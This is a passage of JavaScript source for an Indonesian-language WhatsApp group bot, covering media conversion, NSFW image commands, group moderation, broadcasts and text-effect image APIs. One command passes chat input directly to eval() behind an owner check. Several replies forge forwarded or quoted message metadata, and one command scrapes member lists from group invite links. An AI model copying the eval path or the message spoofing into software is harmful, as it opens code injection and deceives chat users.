khs = await getBuffer(Anu)
alpha.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'alphagan.mp3', quoted:mek, ptt:true})
})
await limitAdd(sender, limit)
					break   
		    case 'runtime':
		    case 'test':
		            run = process.uptime() 
		            teks = `${(kyun(os.uptime()))}`
		            reply(teks)
		            break  
			case 'speed':
			case 'ping':
			const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `\`\`\`${teks}Speed: ${latensi.toFixed(4)} Second\`\`\``
					fakegroup(pingnya)
					})
					break
               
		    case 'totag':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'audio/mp4',
		                ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakegroup(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        await limitAdd(sender, limit)
					break   
		    case 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            let owogi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owogi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            fakegroup('reply stiker')
		            }
		            fs.unlinkSync(owogi)
		            await limitAdd(sender, limit)
					break   
			case 'togif':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            let owoogi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owoogi).then(async res=>{
					let ksksn = await getBuffer(res.result)
		            alpha.sendMessage(from, ksksn, MessageType.video, {mimetype: 'video/gif', gifPlayback: true, caption: lang.success(), quoted: fgif })
		            })
		            }else {
		            fakegroup('Reply stiker')
		            }
		            fs.unlinkSync(owoogi)
		            await limitAdd(sender, limit)
					break   
		    case 'tourl':
			case 'imgtourl':{
                if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
 									 boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
									 owgi = await alpha.downloadMediaMessage(boij)
									 res = await uploadImages(owgi)
									 reply(res)
										} else {
											reply('kirim/reply gambar/video')
										}
										}
											await limitAdd(sender, limit)
					break   
/*
]=====> NSFW MENU<=====[
*/

			case 'awoo':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					await limitAdd(sender, limit)
					break   
			case 'blowjob2':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					await limitAdd(sender, limit)
					break   
			case 'megumin':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					await limitAdd(sender, limit)
					break   
			case 'trapnime':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					await limitAdd(sender, limit)
					break   

/*
]=====> GROUP MENU<=====[
*/
  
			case 'add':  
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
                    if (args.length < 1) return reply('Yang mau di add?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					orang = args[0] + '@s.whatsapp.net'
response = await alpha.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')
else if(inv[0].code == 403){
alpha.sendMessage(from, `User private\n\nMengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
alpha.sendMessage(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
}
					break 
					case 'radd': case 'addreply':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupAdd(from, mentioned)
break

case 'kick':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yau = q.split('@')[1] + '@s.whatsapp.net'
alpha.groupRemove(from, [yau])
reply(`Succses kick target!`)
break

case 'rkick': case 'kickreply':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupRemove(from, mentioned)
break
			case 'antilink':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
              if (args[0] == 'on'){
              if (isAntiLink) return reply(lang.anjawaUdhOn(command))
              antilink.push(from)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOn(command))
              } else if (args[0] == 'off'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOff(command))
              } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Choose one`, [
            {
              buttonId: 'antilink on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antilink off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
       case 'event':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if ( !isOwner && !isCreator && !mek.key.fromMe) return reply("Khusus admin");
					if (args[0] == "on") {
						if (isEventon) return reply(lang.anjawaUdhOn(command))
						event.push(from)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOn(command))
					} else if (args[0] == "off") {
						event.splice(from, 1)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOff(command))
					} else if (!q) {
          sendButMessage(from, `MODE EVENT`, `Choose one`, [
            {
              buttonId: 'event on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'event off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
	case 'antivirtex':
 if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())       
        if (args[0] == "on") {
          if (isAntivirtex) return reply(lang.anjawaUdhOn(command))
          antivirtex.push(from);
          fs.writeFileSync(
            "./src/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply(lang.anjawaOn(command))
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./src/antivirtex.json", JSON.stringify(ant));
          reply(lang.anjawaOff(command))
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Choose one`, [
            {
              buttonId: 'antivirtex on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antivirtex off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
			case 'admin':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					teks = `*DAFTAR ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			
			case 'tagall':
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())       
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())       
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
					teks += `@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

			case 'clearall':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        anu = await alpha.chats.all()
					alpha.setMaxListeners(10)
					for (let _ of anu) {
					alpha.deleteChat(_.jid)
					}
					fakegroup(lang.success())
					break
            case 'out':
                    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					setTimeout( () => {
					alpha.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```Byeee 👋```')
					}, 0)
					break     
		    case 'leave2':
                    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					setTimeout( () => {
					alpha.groupLeave (q) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```Ok gua out```')
					}, 0)
					break       
           case 'getpp':
				if (mek.message.extendedTextMessage != undefined){
					let mentioneddd = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await alpha.getProfilePicture(mentioneddd[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					seeer = `Nama : *${pushname}`
					thumbb = await getBuffer(pic)
					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by zeeone 」`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, thumbb ,image, anuu)
				}
				await limitAdd(sender, limit)
					break   
	case 'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            if (!q) return reply('```Masukkan link groupnya```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('pastikan itu link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
		*Jumlah Member* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply(lang.erorLink())
		             }
		             await limitAdd(sender, limit)
					break   
			case 'return':
			case 'cek':
			case 'me':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					return alpha.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, { quoted: ftroli})
					break
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (args.length < 1) return reply('```TEXT?```')
					arg = args.join(' ');
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					await alpha.sendMessage(_.jid, bc, image, {thumbnail: bc, quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${arg}`})
					}
					fakegroup(lang.successBc())
					} else {
					await ini_bc_pc_bang(arg)
					fakegroup(lang.successBc())
					}
					break
			case 'bcgc':
					case 'bcgroup':
					case 'bcgrup':
					case 'broadcastgrup':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    if (args.length < 1) return reply(`Untuk broadcast ke semua group ketik:\n${prefix}bcgroup [isi chat]`)
                    var group = await alpha.groupMetadata(from)
			ini_bc = args.join(' ')
		var groupz = await alpha.chats.all().filter(v => v.jid.endsWith('g.us'))
                    reply(`\`\`\`[ ! ]\`\`\` Broadcast in progress! Total: ${groupz.length} groups`)
                    await ini_bc_gc_bang(ini_bc)
					reply(`\`\`\`[ ✓ ] Success broadcast : ${groupz.length} groups\`\`\``)
					break
			case 'buggc':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					await alpha.toggleDisappearingMessages(from, 0)
					break
			case 'infogc':
					alpha.updatePresence(from, Presence.composing)
					if (!isGroup) return reply(lang.onlygc())
					try {
					ppimg = await alpha.getProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					alpha.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					await limitAdd(sender, limit)
					break   
			
                case 'memegenerator': case 'memegen':
									if (!isPremium && !mek.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										reply(lang.wait())
										var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
										var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
									   var mediiia = await alpha.downloadMediaMessage(enmedia)
										var njay = await uploadImages(mediiia)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay}`)
										alpha.sendMessage(from, resu, image, {caption:'.stiker', quoted: mek})
										fs.unlinkSync(media)
										} catch (e) {
											console.log(e)
										}
										limitAdd(sender, limit)
									break
					 	case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
						if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* Alphabot`)
									if (q.includes('|')) return reply(`Kirim perintah *${prefix + command}* Alphabot`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										reply(lang.wait())
										var teks2 = args.join(' ')
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
										var mediia = await alpha.downloadMediaMessage(enmedia)
										var njay = await uploadImages(mediia)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/-/${teks2}.png?background=${njay}`)
										alpha.sendMessage(from, resu, image, {caption:'.stiker', quoted: mek})
										fs.unlinkSync(media)
										} catch (e) {
											console.log(e)
										}
										limitAdd(sender, limit)
									break
             case 'demoteall':
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
			                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
			                alpha.groupDemoteAdmin(from, members_id)
			                break
			case 'promoteall':
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
                alpha.groupMakeAdmin(from, members_id)
                break
              case 'promote':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentionede = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
				case 'demote':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentionede = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
                
                /*
                ]----------------------------------------------------------------> API ZEKS <----------------------------------------------------------------[
                */
case 'captain_as':case 'smoke':case 'tiktok2': case 'arcade':case 'battlefield':case 'pubg':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break                         
case 'shadow':case 'cname':case 'romantic':case 'burnpaper':case 'funnycup':case 'love':case 'undergrass':          case 'heart':case 'coffeecup':case 'wood':          case 'flower':         case 'wooden': case '3dsummer':case 'wolf_metal':case '3dnature':case 'underwater':          case 'goldenrose':case 'vector':case 'typography':case 'typography2': case 'underfall':  case 'smokyneon': case 'rainbow': case 'graffiti':case 'camouflage':case '3dglowing':          case 'vintage':case 'honey': case 'whitecube':case 'avatar': case 'glowrainbow':case 'nightsky':case 'fur':case 'flaming': case 'crisp':case 'embroidery':case 'bcake':          case '3dligth':case 'metallic': case 'striking':case 'watermelon':         case 'butterfly':case 'harry':case 'glowneon':case 'coffecup2':          case 'luxury': case 'cemetery':case 'woodblock':case 'sweet':case 'simple':case 'bevel':case 'underflower':         case 'underflower2':
if (args.length < 1) return reply(lang.noteks(prefix, command))
let photooxy2 = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${q}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy2, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break         
case 'halloween2':case 'horror':case 'game8bit':case 'layered':case 'glitch2':case 'coolg':case 'coolwg':case 'realistic':case 'space3d':case 'gtiktok':case 'stone':case 'marvel':case 'marvel2':case 'pornhub':case 'avengers':case 'metalr':case 'metalg':case 'metalg2':case 'halloween2':case 'lion':case 'wolf_bw':case 'wolf_g':case 'ninja':case '3dsteel':case 'horror2':case 'lava':case 'bagel':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let textpro = await getBuffer(`${alphaapi}/textpro/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,textpro, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break 
 case 'blackpink':case 'rainbow2':case 'water_pipe':case 'halloween':case 'sketch':case 'sircuit':case 'discovery':case 'metallic2':case 'fiction':case 'demon':case 'transformer':case 'berry':case 'thunder':case 'magma':case '3dstone':case 'neon':case 'glitch':case 'harry_potter':case 'embossed':case 'broken':case 'papercut':case 'gradient':case 'glossy':case 'watercolor':case 'multicolor':case 'neon_devil':case 'underwater':case 'bear':case 'wonderfulg':case 'christmas':case 'neon_light':case 'snow':case 'cloudsky':case 'luxury2':case 'gradient2':case 'summer':case 'writing':case 'engraved':case 'summery':case '3dglue':case 'metaldark':case 'neonlight':case 'oscar':case 'minion':case 'holographic':case 'purple':case 'glossyb':case 'deluxe2':case 'glossyc':case 'fabric':case 'neonc':case 'newyear':case 'newyear2':case 'metals':case 'xmas':case 'blood':case 'darkg':case 'joker':case 'wicker':case 'natural':case 'firework':case 'skeleton':case 'balloon':case 'balloon2':case 'balloon3':case 'balloon4':case 'balloon5':case 'balloon6':case 'balloon7':case 'steel':case 'gloss':case 'denim':case 'decorate':case 'decorate2':case 'peridot':case 'rock':case 'glass':case 'glass2':case 'glass3':case 'glass4':case 'glass5':case 'glass6':case 'glass7':case 'glass8':case 'captain_as2':case 'robot':case 'equalizer':case 'toxic':case 'sparkling':case 'sparkling2':case 'sparkling3':case 'sparkling4':case 'sparkling5':case 'sparkling6':case 'sparkling7':case 'decorative':case 'chocolate':case 'strawberry':case 'koifish':case 'bread':case 'matrix':case 'blood2':case 'neonligth2':case 'thunder2':case '3dbox':case 'neon2':case 'roadw':case 'bokeh':case 'gneon':case 'advanced':case 'dropwater':case 'wall':case 'chrismast':case 'honey':case 'drug':case 'marble':case 'marble2':case 'ice':case 'juice':case 'rusty':case 'abstra':case 'biscuit':case 'wood':case 'scifi':case 'metalr':case 'purpleg':case 'shiny': case 'jewelry':case 'jewelry2':case 'jewelry3':case 'jewelry4':case 'jewelry5':case 'jewelry6':case 'jewelry7':case 'jewelry8':case 'metalh':case 'golden':case 'glitter':case 'glitter2':case 'glitter3':case 'glitter4':case 'glitter5':case 'glitter6':case 'glitter7':case 'metale':case 'carbon':case 'candy':case 'metalb':case 'gemb':case '3dchrome':case 'metalb2':case 'metalg':
if (args.length < 1) return reply(lang.noteks(prefix, command))
let textpro2 = await getBuffer(`${alphaapi}/textpro/${command}?apikey=${alphakey}&text=${q}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,textpro2, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break  
case 'tahta':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   tahta = await getBuffer(`${ApiZeks}/api/hartatahta?text=${F}&apikey=${zeksApikey}`)
                   tahtah = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
